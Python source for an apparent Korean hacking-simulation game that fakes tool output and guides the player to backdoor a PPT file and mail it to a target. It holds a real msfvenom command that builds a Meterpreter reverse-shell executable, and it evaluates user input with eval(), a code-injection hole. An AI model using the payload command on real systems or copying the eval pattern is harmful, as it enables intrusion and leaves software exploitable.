from random import *
import os

def semStep(step: int):
	semStep = [0,1,2,2,10]
	return semStep[step]

def metasploit(src: int):
	return(f'META')

def hack(src: int):
	return(f'\n===== HACKTOOL for ToolKIDDIES ver.5.0 ======\n[*] Args: {src}\n')

def ipconfig(src: str):
	return('''Windows IP 구성

이더넷 어댑터 이더넷:

   연결별 DNS 접미사. . . . : 
   링크-로컬 IPv6 주소 . . . . : fe80::99ff:aae8:27e0:d6bd%16
   IPv4 주소 . . . . . . . . . : 144.13.135.13
   서브넷 마스크 . . . . . . . : 255.255.255.0
   기본 게이트웨이 . . . . . . : 144.13.135.255

무선 LAN 어댑터 Wi-Fi:

   미디어 상태 . . . . . . . . : 미디어 연결 끊김
   연결별 DNS 접미사. . . . : \n''')

def ipsec(src: int):
	if len(src) == 0:
		return '\nIPSEC (Internet Protocol SECure) verR\n'
	intro = f'\n===== IPSEC (Internet Protocol SECure) verR ======\n[*] Args: {src}\n'
	if src[0] != '--ip' and src[3] != '--port':
		appre = 'Not Valid Arguments'
		return(intro + appre)
	
	appre = f'[*] Scanning IP {src[1]}\n[*] Scanning PORT {src[3]}\n'
	appre += f'[*] Scanning TCPIP INJECTION ATTACK PORT\n'
	appre += f'[*] Scanning OSI INJECTION ATTACK PORT\n'
	appre += f'[*] Scanning with Stelth PORT Scanning\n'

	return(intro + appre)

def install(src: int):
	return(f'\n[*] Program Initalized...\n[*] Installing {src[0]} program...\n[*] Installed {src[0]} Version.{chr(randrange(65,80))}{randrange(20)}\n')

def result(cmd: str):
	flag = cmd.split(' ')
	app = flag[0]
	del(flag[0])
	if not app in globals().keys():
		result = 'Unknown Command. Check if installed or spelling.\n<ERROR Code:0xE3A4 Reg:'+app+'></ERROR>\n'
	else:
		result = eval(app+f'({flag})')
	return(result)

def tip(step: int):
	tip = ['You FOUND Easter EGG!!!\n\nCONGRATUATIONS\n\nhttps://m03.pw/hacknet_ItsEasterEgg.html',
	'우리가 울랄라 대장의 이메일 주소를 알아냈어.\n이 주소로 백도어가 심어진 PPT파일을 보내야 해.\n먼저 PPT파일에 백도어를 심어보자.\n백도어를 만들때에는 Metasploit를 사용합니다.\n먼저, 자신의 IP를 알아내자! 어떻게 해야 할까??\n',
	'백도어를 만들어 보자! METASPLOIT이라는 프로그램은, 백도어가 심어진 파일을 만들 수 있게 해줘. 이제 Metasploit을 사용하는 법을 알아야 겠지? 어떤 명령어의 도움말을 알기 위해서는 "man <CMD>"라는 명령어를 사용해. 기억해 두자! 이제 사용법을 알아볼까?',
	'이제 백도어를 만들어야 겠지? 만들어 보자! 우리가 쓸 페이로드는 windows/meterpreter/reverse_tcp야!',
	'울랄라 대장의 이메일은\ngshs_decode@gmail.com\n이야. 여기에 만든 파일을 보내자.\n보내고 나서는 메일을 확인하는 명령어를 실행하자!',
	'''It's Step 4!''',
	'''It's Step 5!''',
	'''It's Step 6!''',
	'''It's Step 7!'''
	]

	return(tip[step])

def newTip(step: int, count: int):
	print(step, count)
	if count == semStep(step):
		return '다음 단계로 넘어가자'
	nTip = ['',
	['좋아! IP주소를 알아냈지? 이제  이제 다음 단계로 넘어가서 백도어 파일을 만들자!!'],
	['도움말을 읽어보고 무엇을 해야 할지 생각해 보자! 근데 페이로드는 뭐고, msfvenom은 뭐지..? 영상을 볼까?? ==> "openvideo"','sys:run start chrome https://m03.pw/video_1.mp4'],
	['이제 바탕화면에 EXE파일이 생성되었겠지?? 이걸 보내보자!'],
	['보내고 나서 답장을 확인하자! 만약 답장이 왔다면 백도어가 작동하는지 확인하자!\n','좋아! 백도어가 잘 심어졌군!! 이제 제대로 해킹을 해보자구!\n\n다음단계로!'],
	['sys:run start chrome https://google.com']
	]
	newTip = nTip[step][count]
	if 'sys:run ' in newTip:
		os.system(newTip.replace('sys:run ',''))
	return newTip

def isCorrect(cmd: str, step: int, count: int):
	print(cmd, step, count)
	lis = ['',
	['ipconfig'],
	['man metasploit','openvideo'],
	['msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=2031 -f exe > back.exe'],
	['checkmail','msfvenom ping 0.0.0.0'],
	['openweb']
	]
	if lis[step][count] == cmd:
		print(True)
		return True